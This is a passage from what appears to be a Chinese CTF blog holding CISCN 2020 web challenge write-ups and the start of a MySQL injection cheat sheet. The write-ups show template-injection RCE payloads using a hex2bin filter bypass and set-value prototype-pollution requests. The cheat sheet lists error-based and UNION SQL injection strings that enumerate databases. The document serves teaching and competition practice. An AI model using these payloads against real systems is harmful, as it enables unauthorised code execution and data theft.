class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parserIfLabel</span>(<span class="hljs-params"> <span class="hljs-variable">$content</span> </span>) </span>&#123;    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;    <span class="hljs-keyword">if</span> ( preg_match_all( <span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$matches</span> ) ) &#123;        <span class="hljs-variable">$count</span> = count( <span class="hljs-variable">$matches</span>[ <span class="hljs-number">0</span> ] );        <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$count</span>; <span class="hljs-variable">$i</span>++ ) &#123;            <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;            <span class="hljs-variable">$out_html</span> = <span class="hljs-string">&#x27;&#x27;</span>;            <span class="hljs-variable">$ifstr</span> = <span class="hljs-variable">$matches</span>[ <span class="hljs-number">1</span> ][ <span class="hljs-variable">$i</span> ];            <span class="hljs-variable">$ifstr</span>=danger_key(<span class="hljs-variable">$ifstr</span>,<span class="hljs-number">1</span>);            <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$ifstr</span>,<span class="hljs-string">&#x27;=&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$arr</span>= splits(<span class="hljs-variable">$ifstr</span>,<span class="hljs-string">&#x27;=&#x27;</span>);                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;&#x27;</span>)&#123;                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;很抱歉，模板中有错误的判断,请修正【&#x27;</span>.<span class="hljs-variable">$ifstr</span>.<span class="hljs-string">&#x27;】&#x27;</span>);                &#125;                <span class="hljs-variable">$ifstr</span> = str_replace( <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;==&#x27;</span>, <span class="hljs-variable">$ifstr</span> );            &#125;            <span class="hljs-variable">$ifstr</span> = str_replace( <span class="hljs-string">&#x27;&lt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;!=&#x27;</span>, <span class="hljs-variable">$ifstr</span> );            <span class="hljs-variable">$ifstr</span> = str_replace( <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span>, <span class="hljs-variable">$ifstr</span> );            <span class="hljs-variable">$ifstr</span> = str_replace( <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>, <span class="hljs-variable">$ifstr</span> );            <span class="hljs-variable">$ifstr</span> = str_replace( <span class="hljs-string">&#x27;mod&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-variable">$ifstr</span> );            <span class="hljs-variable">$ifstr</span> = str_replace( <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-variable">$ifstr</span> );            <span class="hljs-keyword">if</span> ( preg_match( <span class="hljs-string">&#x27;/\&#123;|&#125;/&#x27;</span>, <span class="hljs-variable">$ifstr</span>)) &#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;很抱歉，模板中有错误的判断,请修正&#x27;</span>.<span class="hljs-variable">$ifstr</span>);            &#125;<span class="hljs-keyword">else</span>&#123;                @<span class="hljs-keyword">eval</span>( <span class="hljs-string">&#x27;if(&#x27;</span> . <span class="hljs-variable">$ifstr</span> . <span class="hljs-string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );            &#125;            <span class="hljs-keyword">if</span> ( preg_match( <span class="hljs-string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, <span class="hljs-variable">$matches</span>[ <span class="hljs-number">2</span> ][ <span class="hljs-variable">$i</span> ], <span class="hljs-variable">$matches2</span> ) ) &#123;                <span class="hljs-keyword">switch</span> ( <span class="hljs-variable">$flag</span> ) &#123;                    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;if&#x27;</span>:                        <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$matches2</span>[ <span class="hljs-number">1</span> ] ) ) &#123;                            <span class="hljs-variable">$out_html</span> .= <span class="hljs-variable">$matches2</span>[ <span class="hljs-number">1</span> ];                        &#125;                        <span class="hljs-keyword">break</span>;                    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;else&#x27;</span>:                        <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$matches2</span>[ <span class="hljs-number">2</span> ] ) ) &#123;                            <span class="hljs-variable">$out_html</span> .= <span class="hljs-variable">$matches2</span>[ <span class="hljs-number">2</span> ];                        &#125;                        <span class="hljs-keyword">break</span>;                &#125;            &#125; <span class="hljs-keyword">elseif</span> ( <span class="hljs-variable">$flag</span> == <span class="hljs-string">&#x27;if&#x27;</span> ) &#123;                <span class="hljs-variable">$out_html</span> .= <span class="hljs-variable">$matches</span>[ <span class="hljs-number">2</span> ][ <span class="hljs-variable">$i</span> ];            &#125;            <span class="hljs-variable">$pattern2</span> = <span class="hljs-string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;            <span class="hljs-keyword">if</span> ( preg_match( <span class="hljs-variable">$pattern2</span>, <span class="hljs-variable">$out_html</span>, <span class="hljs-variable">$matches3</span> ) ) &#123;                <span class="hljs-variable">$out_html</span> = str_replace( <span class="hljs-string">&#x27;&#123;if&#x27;</span> . <span class="hljs-variable">$matches3</span>[ <span class="hljs-number">1</span> ], <span class="hljs-string">&#x27;&#123;if&#x27;</span>, <span class="hljs-variable">$out_html</span> );                <span class="hljs-variable">$out_html</span> = str_replace( <span class="hljs-string">&#x27;&#123;else&#x27;</span> . <span class="hljs-variable">$matches3</span>[ <span class="hljs-number">1</span> ] . <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&#123;else&#125;&#x27;</span>, <span class="hljs-variable">$out_html</span> );                <span class="hljs-variable">$out_html</span> = str_replace( <span class="hljs-string">&#x27;&#123;end if&#x27;</span> . <span class="hljs-variable">$matches3</span>[ <span class="hljs-number">1</span> ] . <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&#123;end if&#125;&#x27;</span>, <span class="hljs-variable">$out_html</span> );                <span class="hljs-variable">$out_html</span> = <span class="hljs-keyword">$this</span>-&gt;parserIfLabel( <span class="hljs-variable">$out_html</span> );            &#125;            <span class="hljs-variable">$content</span> = str_replace( <span class="hljs-variable">$matches</span>[ <span class="hljs-number">0</span> ][ <span class="hljs-variable">$i</span> ], <span class="hljs-variable">$out_html</span>, <span class="hljs-variable">$content</span> );        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">splits</span>(<span class="hljs-params"> <span class="hljs-variable">$s</span>, <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;,&#x27;</span> </span>) </span>&#123;    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">empty</span>( <span class="hljs-variable">$s</span> ) ) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&#x27;</span> );    <span class="hljs-keyword">if</span> ( strpos( <span class="hljs-variable">$s</span>, <span class="hljs-variable">$str</span> ) !== <span class="hljs-literal">false</span> ) &#123;        <span class="hljs-keyword">return</span> explode( <span class="hljs-variable">$str</span>, <span class="hljs-variable">$s</span> );    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>( <span class="hljs-variable">$s</span> );    &#125;&#125;</code></pre></div><h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><ul><li>模板注入</li><li>代码审计</li></ul><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ul><li><p>这道题的代码与zzzphpV1.6.1中的代码相似，可以参考<a href="https://www.anquanke.com/post/id/173991#h2-2">zzzphpV1.6.1 远程代码执行漏洞简单分析</a>进行功能的分析</p><p>比文章中多了一个danger_key函数</p><p><img src="https://img-blog.csdnimg.cn/20200825081056239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNjk3MTA5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p></li></ul><p>  另外还增加了一些别的过滤条件</p>  <div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( preg_match( <span class="hljs-string">&#x27;/\&#123;|&#125;/&#x27;</span>, <span class="hljs-variable">$ifstr</span>)) &#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;很抱歉，模板中有错误的判断,请修正&#x27;</span>.<span class="hljs-variable">$ifstr</span>);&#125;</code></pre></div>  <div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">splits</span>(<span class="hljs-params"> <span class="hljs-variable">$s</span>, <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;,&#x27;</span> </span>) </span>&#123;    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">empty</span>( <span class="hljs-variable">$s</span> ) ) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&#x27;</span> );    <span class="hljs-keyword">if</span> ( strpos( <span class="hljs-variable">$s</span>, <span class="hljs-variable">$str</span> ) !== <span class="hljs-literal">false</span> ) &#123;        <span class="hljs-keyword">return</span> explode( <span class="hljs-variable">$str</span>, <span class="hljs-variable">$s</span> );    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>( <span class="hljs-variable">$s</span> );    &#125;&#125;</code></pre></div><ul><li><p>对于<code>$pattern = &#39;/&#123;if:([sS]+?)&#125;([sS]*?)&#123;ends+if&#125;/&#39;;</code></p><p>参考文章中给出的匹配规则：<code>&#123;if:(匹配内容)&#125;(匹配内容)&#123;end if&#125;</code></p><p>假如匹配的内容为<code>&#123;if:phpinfo()&#125;;&#123;end if&#125;</code></p><p>则最后经过</p><div class="hljs code-wrapper"><pre><code class="hljs php">@<span class="hljs-keyword">eval</span>( <span class="hljs-string">&#x27;if(&#x27;</span> . <span class="hljs-variable">$ifstr</span> . <span class="hljs-string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</code></pre></div><p>拼接出来为<code>if(phpinfo())&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;</code></p><p>文章给出的payload：<code>&#123;if:assert($_request[phpinfo()])&#125;phpinfo();&#123;end if&#125;</code></p><p>如果正则不好理解的可以到这里进行测试<a href="https://regex101.com/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E7%BB%99%E5%87%BA%E8%A6%81%E5%8C%B9%E9%85%8D%E7%9A%84%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%96%B9%E4%BE%BF%E7%90%86%E8%A7%A3%E3%80%82">https://regex101.com/，这个网站可以直接给出要匹配的字符，方便理解。</a></p><p><img src="https://img-blog.csdnimg.cn/2020082508111992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNjk3MTA5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p></li></ul><ul><li><p>调试分析</p><p>输入<code>&#123;if:phpinfo()&#125;;&#123;end if&#125;</code></p><p>匹配内容为phpinfo()，经过danger_key过滤就将php过滤掉了。</p><p>只要绕过这个过滤就好了。发现hex2bin没有被过滤</p><p>构造system(ls /)：hex2bin(73797374656d)(‘ls /‘)</p><p><img src="https://img-blog.csdnimg.cn/20200825081150232.png#pic_center" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A1dvLzyb-1598313965688)(D:/Notes/web%25E5%25AE%2589%25E5%2585%25A8/assets/image-20200824104953320.png)]"></p></li></ul><p>  成功执行。</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><div class="hljs code-wrapper"><pre><code class="hljs php">&#123;<span class="hljs-keyword">if</span>:(hex2bin(<span class="hljs-string">&#x27;7265616466696c65&#x27;</span>))(<span class="hljs-string">&#x27;../../../../../../flag&#x27;</span>)&#125;;&#123;end <span class="hljs-keyword">if</span>&#125;</code></pre></div><h2 id="web4：littlegame"><a href="#web4：littlegame" class="headerlink" title="web4：littlegame"></a>web4：littlegame</h2><h3 id="题目源码："><a href="#题目源码：" class="headerlink" title="题目源码："></a>题目源码：</h3><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> setFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;set-value&#x27;</span>);<span class="hljs-keyword">var</span> router = express.Router();<span class="hljs-keyword">const</span> COMMODITY = &#123;    <span class="hljs-string">&quot;sword&quot;</span>: &#123;<span class="hljs-string">&quot;Gold&quot;</span>: <span class="hljs-string">&quot;20&quot;</span>, <span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;50&quot;</span>&#125;,    <span class="hljs-comment">// Times have changed</span>    <span class="hljs-string">&quot;gun&quot;</span>: &#123;<span class="hljs-string">&quot;Gold&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;200&quot;</span>&#125;&#125;<span class="hljs-keyword">const</span> MOBS = &#123;    <span class="hljs-string">&quot;Lv1&quot;</span>: &#123;<span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Bounty&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;,    <span class="hljs-string">&quot;Lv2&quot;</span>: &#123;<span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;Bounty&quot;</span>: <span class="hljs-string">&quot;10&quot;</span>&#125;,    <span class="hljs-string">&quot;Lv3&quot;</span>: &#123;<span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;10&quot;</span>, <span class="hljs-string">&quot;Bounty&quot;</span>: <span class="hljs-string">&quot;15&quot;</span>&#125;,    <span class="hljs-string">&quot;Lv4&quot;</span>: &#123;<span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;20&quot;</span>, <span class="hljs-string">&quot;Bounty&quot;</span>: <span class="hljs-string">&quot;30&quot;</span>&#125;,    <span class="hljs-string">&quot;Lv5&quot;</span>: &#123;<span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;50&quot;</span>, <span class="hljs-string">&quot;Bounty&quot;</span>: <span class="hljs-string">&quot;65&quot;</span>&#125;,    <span class="hljs-string">&quot;Lv6&quot;</span>: &#123;<span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;80&quot;</span>, <span class="hljs-string">&quot;Bounty&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>&#125;&#125;<span class="hljs-keyword">const</span> BOSS = &#123;    <span class="hljs-comment">// Times have not changed</span>    <span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-string">&quot;201&quot;</span>&#125;<span class="hljs-keyword">const</span> Admin = &#123;    <span class="hljs-string">&quot;password1&quot;</span>:process.env.p1,    <span class="hljs-string">&quot;password2&quot;</span>:process.env.p2,    <span class="hljs-string">&quot;password3&quot;</span>:process.env.p3&#125;router.post(<span class="hljs-string">&#x27;/BuyWeapon&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;    <span class="hljs-comment">// not implement</span>    res.send(<span class="hljs-string">&quot;BOOS has said &#x27;Times have not changed&#x27;!&quot;</span>);&#125;);router.post(<span class="hljs-string">&#x27;/EarnBounty&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;    <span class="hljs-comment">// not implement</span>    res.send(<span class="hljs-string">&quot;BOOS has said &#x27;Times have not changed&#x27;!&quot;</span>);&#125;);router.post(<span class="hljs-string">&#x27;/ChallengeBOSS&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;    <span class="hljs-comment">// not implement</span>    res.send(<span class="hljs-string">&quot;BOOS has said &#x27;Times have not changed&#x27;!&quot;</span>);&#125;);router.post(<span class="hljs-string">&quot;/DeveloperControlPanel&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;    <span class="hljs-comment">// not implement</span>    <span class="hljs-keyword">if</span> (req.body.key === <span class="hljs-literal">undefined</span> || req.body.password === <span class="hljs-literal">undefined</span>)&#123;        res.send(<span class="hljs-string">&quot;What&#x27;s your problem?&quot;</span>);    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">let</span> key = req.body.key.toString();        <span class="hljs-keyword">let</span> password = req.body.password.toString();        <span class="hljs-keyword">if</span>(Admin[key] === password)&#123;            res.send(process.env.flag);        &#125;<span class="hljs-keyword">else</span> &#123;            res.send(<span class="hljs-string">&quot;Wrong password!Are you Admin?&quot;</span>);        &#125;    &#125;&#125;);router.get(<span class="hljs-string">&#x27;/SpawnPoint&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;    req.session.knight = &#123;        <span class="hljs-string">&quot;HP&quot;</span>: <span class="hljs-number">1000</span>,        <span class="hljs-string">&quot;Gold&quot;</span>: <span class="hljs-number">10</span>,        <span class="hljs-string">&quot;Firepower&quot;</span>: <span class="hljs-number">10</span>    &#125;    res.send(<span class="hljs-string">&quot;Let&#x27;s begin!&quot;</span>);&#125;);router.post(<span class="hljs-string">&quot;/Privilege&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;    <span class="hljs-comment">// Why not ask witch for help?</span>    <span class="hljs-keyword">if</span>(req.session.knight === <span class="hljs-literal">undefined</span>)&#123;        res.redirect(<span class="hljs-string">&#x27;/SpawnPoint&#x27;</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span> (req.body.NewAttributeKey === <span class="hljs-literal">undefined</span> || req.body.NewAttributeValue === <span class="hljs-literal">undefined</span>) &#123;            res.send(<span class="hljs-string">&quot;What&#x27;s your problem?&quot;</span>);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">let</span> key = req.body.NewAttributeKey.toString();            <span class="hljs-keyword">let</span> value = req.body.NewAttributeValue.toString();            setFn(req.session.knight, key, value);            res.send(<span class="hljs-string">&quot;Let&#x27;s have a check!&quot;</span>);        &#125;    &#125;&#125;);<span class="hljs-built_in">module</span>.exports = router;</code></pre></div><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><ul><li><p>set-value库 原型链污染，可参考：<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">const</span> setFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;set-value&#x27;</span>);<span class="hljs-keyword">const</span> paths = [  <span class="hljs-string">&#x27;constructor.prototype.a0&#x27;</span>,  <span class="hljs-string">&#x27;__proto__.a1&#x27;</span>,];<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> p <span class="hljs-keyword">of</span> paths) &#123;      setFn(&#123;&#125;, p, <span class="hljs-literal">true</span>);  &#125;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; paths.length; i++) &#123;      <span class="hljs-keyword">if</span> ((&#123;&#125;)[<span class="hljs-string">`a<span class="hljs-subst">$&#123;i&#125;</span>`</span>] === <span class="hljs-literal">true</span>) &#123;          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Yes with <span class="hljs-subst">$&#123;paths[i]&#125;</span>`</span>);      &#125;  &#125;&#125;check();</code></pre></div></li></ul><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><ul><li>使用参考文章中的方法，将指定的变量加入Admin的原型。</li><li>然后访问即可</li></ul><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">NewAttributeKey</span>=constructor.prototype.a0&amp;NewAttributeValue=<span class="hljs-literal">true</span></code></pre></div><h2 id="web5：easytrick"><a href="#web5：easytrick" class="headerlink" title="web5：easytrick"></a>web5：easytrick</h2><h3 id="题目源码-1"><a href="#题目源码-1" class="headerlink" title="题目源码"></a>题目源码</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick2</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;trick1 = (<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;trick1;        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;trick1) &gt; <span class="hljs-number">5</span> || strlen(<span class="hljs-keyword">$this</span>-&gt;trick2) &gt; <span class="hljs-number">5</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你太长了&quot;</span>);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;trick1 !== <span class="hljs-keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="hljs-keyword">$this</span>-&gt;trick1) === md5(<span class="hljs-keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;trick1 != <span class="hljs-keyword">$this</span>-&gt;trick2)&#123;            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);        &#125;    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;trick&#x27;</span>]);</code></pre></div><h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><ul><li><p><strong>浮点数精度问题导致的大小比较以及函数处理问题</strong></p><p>当小数小于10^-16后，PHP对于小数就大小不分了</p><p>var_dump(1.000000000000000 == 1) &gt;&gt; TRUE</p><p>var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE</p></li></ul><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ul><li><p>本题所需要用到的是：0.9（17个9）后化为1，strlen判断为1</p><p>所以可以使trick1=1，trick2=0.9999999999999999</p><p>并且0.9999999999999999！= 1</p><p>md5(0.9999999999999999) == md5(1)</p></li></ul><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick1</span> ;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$trick2</span> ;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> trick();<span class="hljs-variable">$a</span>-&gt;trick1 = <span class="hljs-number">1</span>;<span class="hljs-variable">$a</span>-&gt;trick2 = <span class="hljs-number">0.9999999999999999</span>;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>CISCN 2020初赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>ctf</tag>
      
      <tag>rce</tag>
      
      <tag>unserialize</tag>
      
      <tag>set-value库原型链污染</tag>
      
      <tag>浮点数精度问题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql注入基础</title>
    <link href="/2020/08/20/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/08/20/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Mysql注入基础"><a href="#1-Mysql注入基础" class="headerlink" title="1. Mysql注入基础"></a>1. Mysql注入基础</h1><h2 id="1-1-联合注入"><a href="#1-1-联合注入" class="headerlink" title="1.1 联合注入"></a>1.1 联合注入</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()) <span class="hljs-comment">--+</span></code></pre></div><h2 id="1-2-报错注入"><a href="#1-2-报错注入" class="headerlink" title="1.2 报错注入"></a>1.2 报错注入</h2><h3 id="1-2-1-UpdateXML"><a href="#1-2-1-UpdateXML" class="headerlink" title="1.2.1 UpdateXML"></a>1.2.1 UpdateXML</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">select updatexml(1,concat(0x2b,(version()),0x2b),1);AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema&#x3D;data_column LIMIT data_offset,1)),null)--AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME&#x3D;data_table LIMIT data_offset,1)),null)--AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--</code></pre></div><h3 id="1-2-2-Extractvalue"><a href="#1-2-2-Extractvalue" class="headerlink" title="1.2.2 Extractvalue"></a>1.2.2 Extractvalue</h3><p>Works with <code>MySQL &gt;= 5.1</code></p><div class="hljs code-wrapper"><pre><code class="hljs mysql">?id&#x3D;1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--?id&#x3D;1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--?id&#x3D;1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema&#x3D;data_column LIMIT data_offset,1)))--?id&#x3D;1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME&#x3D;data_table LIMIT data_offset,1)))--?id&#x3D;1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--</code></pre></div><h3 id="1-2-3-MySQL列名重复报错"><a href="#1-2-3-MySQL列名重复报错" class="headerlink" title="1.2.3 MySQL列名重复报错"></a>1.2.3 MySQL列名重复报错</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155013049.png" alt="image-20210313155013049"></p><h4 id="1-2-3-1-join函数构造列名重复"><a href="#1-2-3-1-join函数构造列名重复" class="headerlink" title="1.2.3.1 join函数构造列名重复"></a>1.2.3.1 join函数构造列名重复</h4><p><a href="http://wxb.github.io/2016/12/15/MySQL%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8Djoin.html">http://wxb.github.io/2016/12/15/MySQL%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8Djoin.html</a></p><div class="hljs code-wrapper"><pre><code class="hljs mysql">select *  from(select * from users a join users b)c;</code></pre></div><p><img 